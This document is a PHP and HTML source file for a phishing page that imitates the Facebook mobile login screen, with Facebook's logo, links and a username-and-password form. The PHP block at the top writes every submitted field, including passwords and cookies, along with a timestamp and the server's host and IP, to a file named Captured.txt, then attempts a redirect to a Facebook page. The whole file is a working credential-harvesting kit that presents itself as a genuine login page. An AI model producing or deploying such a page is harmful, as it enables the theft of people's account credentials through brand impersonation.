<?php
if(isset($_POST['submit'])){
	$date = (new DateTime())->setTimeZone(new DateTimeZone('Asia/Kathmandu'))->format('Y-m-d h:i:s A');//set time foramt
	$host= gethostname();//find server hostmane
	$hostip = gethostbyname($host);//find server host ip
	$file = fopen('Captured.txt','a');
	fwrite($file, "*******************************************************************");
	fwrite($file, "\r\n");
	fwrite($file, "Date \t\t:-\t\t ");//print date
	fwrite($file, $date);
	fwrite($file, "\r\n");
	fwrite($file, "Host(webserver) \t\t:-\t\t ");//print hostname
	fwrite($file, $host);
	fwrite($file, "\r\n");
	fwrite($file, "Host ip \t\t:-\t\t ");//print host ip
	fwrite($file, $hostip);
	foreach($_REQUEST as $variable=>$value){//loop for $_REQUEST header ($_REQUEST is $_GET, $_POST and $_COOKIE)
	    fwrite($file,"\r\n");
	    fwrite($file,$variable);
	    fwrite($file," \t\t:-\t\t ");
	    fwrite($file,$value);
	}
	$ip = substr($_SERVER['HTTP_HOST'],0,strpos($_SERVER['HTTP_HOST'],':'));
	if(strlen($ip)>0)
		fwrite($file,"IP of site: \t\t:-\t\t ".$value);
	
	fclose($file);

	header("https://www.facebook.com/gaming/play/omgplay");
}
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
	<title>Facebook - Log in or Sign Up</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">

	<style type="text/css">
		html{scroll-behavior: smooth!important;}
	    #base-contents{
	        display: flex!important;
	        flex-direction: column!important;
	        min-height: 100vh!important;
	        min-width: 100%!important;
	        max-width: 100%!important;
	        width: 100%!important;
	    }
		.facebook-icon {
			width: 112px;
		}
		.language {
			text-decoration: none;
			font-size: 12px;
			line-height: 16px;
			color: #576b95;
			margin: 1px;
		}
		.language.selected {
			font-weight: bold;
			color: #90949c;
		}
		.language_plus {
			color: #90949c;
			font-weight: bolder;
			border: 2px solid #576b95;
			border-radius: 5px;
			margin: 5px;
			padding: 3px;
			padding-right: 5px;
			padding-left: 5px;
			cursor: pointer;	
		}
		.footer-small{
			color: #8a8d91;
			margin-left: 2px;
			margin-right: 2px;
			cursor: pointer;
			text-decoration: none;
			font-size: 10px;
		}
		.footer-large{
			color: gray;
			cursor: pointer;
			text-decoration: none;
			font-size: 12px;
		}
	</style>

</head>
<body style="width: 100% !important; padding: 20px;">

	<div id="base-contents" class="container">
		<div class="d-flex flex-column mt-5 mb-2 w-100">
			<div class="facebook-icon-wrapper d-flex flex-row justify-content-center align-items-center w-100">
				<a>
					<img href="https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMxNzg2MTg2LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&refid=8" class="facebook-icon" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
				</a>
			</div>
		</div>
		<div class="form-container d-flex flex-column justify-content-center align-items-center">
			<form action="" method="post" class="mb-5 form-container d-flex flex-column w-100">
				<div class="my-1 align-items-stretch">
					<input type="text" name="username" class="form-control align-self-stretch" placeholder="Mobile number or email" style="width: 100% !important; min-height: 45px; padding: 12px; line-height: 18px; font-size: 14px; background-color: #f5f6f7;" />
				</div>
				<div class="my-1 align-items-stretch">
					<input type="password" name="password" class="form-control align-self-stretch" placeholder="Password" style="width: 100% !important; min-height: 45px; padding: 12px; line-height: 18px; font-size: 14px; background-color: #f5f6f7;" />
				</div>
				<div class="my-2 align-items-stretch">
					<button type="submit" name="submit" class="btn btn-primary align-self-stretch" style="width: 100% !important; min-height: 40px; padding: 12px; line-height: 18px; font-size: 14px; font-weight: bold; height: 40px;" >
						Log In
					</button>
				</div>
				<div class="my-2 d-flex flex-row justify-content-center align-items-center">
					<a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&r&cuid&ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMxNzg2MTg2LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&lwv=100&refid=8" style="text-decoration: none;">
						<span class="text-primary align-self-stretch" style="width: 100% !important; font-size: 14px; text-align: center;" >
						Forgot Password?
						</span>
					</a>
				</div>
				<div class="my-2 d-flex flex-row flex-nowrap justify-content-center align-items-center">
					<div style="background-color: #ccd0d5; width: 100%; height: 1px;"></div>
					<span class="mx-3" style="font-size: 14px; text-align: center; text-decoration-color: #4b4f56;" >
					or
					</span>
					<div style="background-color: #ccd0d5; width: 100%; height: 1px;"></div>
				</div>
				<div class="my-2 mx-auto align-items-center">
					<button type="submit" name="submit" class="btn btn-success align-self-center" style="max-height: 35px; padding: 10px; line-height: 15px; font-size: 14px; font-weight: bold; height: 40px; background-color: #00a400;" >
						Create New Account
					</button>
				</div>
			</form>
			<div class="row mt-5 w-100">
				<div class="col-6 d-flex flex-column justify-content-center align-items-center">
					<a class="language selected">English (US)</a>
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=hi_IN&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">हिन्दी</a>
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">Português (Brasil)</a>
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=de_DE&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">Deutsch</a>
				</div>
				<div class="col-6 d-flex flex-column justify-content-center align-items-center">
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=ne_NP&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">नेपाली</a>
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">Español</a>
					<a class="language" href="https://m.facebook.com/intl/save_locale/?loc=fr_FR&href=https%3A%2F%2Fm.facebook.com%2F&ls_ref=mobile_suggested_locale_selector&refid=8">Français (France)</span>
					<a class="language" href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2F&refid=8"><span class="language_plus">+</span></a>
				</div>
			</div>
		</div>
		<div class="d-flex flex-row flex-wrap justify-content-center align-items-center">
			<a href="https://about.facebook.com/?refid=8" class="footer-small">About</a>
			<span class="footer-small">.</span>
			<a href="https://m.facebook.com/help/?ref=pf&refid=8" class="footer-small">Help</a>
			<span class="footer-small">.</span>
			<a href="#" class="footer-small">More</a>
		</div>
		<div class="d-flex flex-row flex-wrap justify-content-center align-items-center">
			<a href="#" class="footer-large">Facebook Inc.</span>
		</div>
	</div>

	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>
</body>
</html>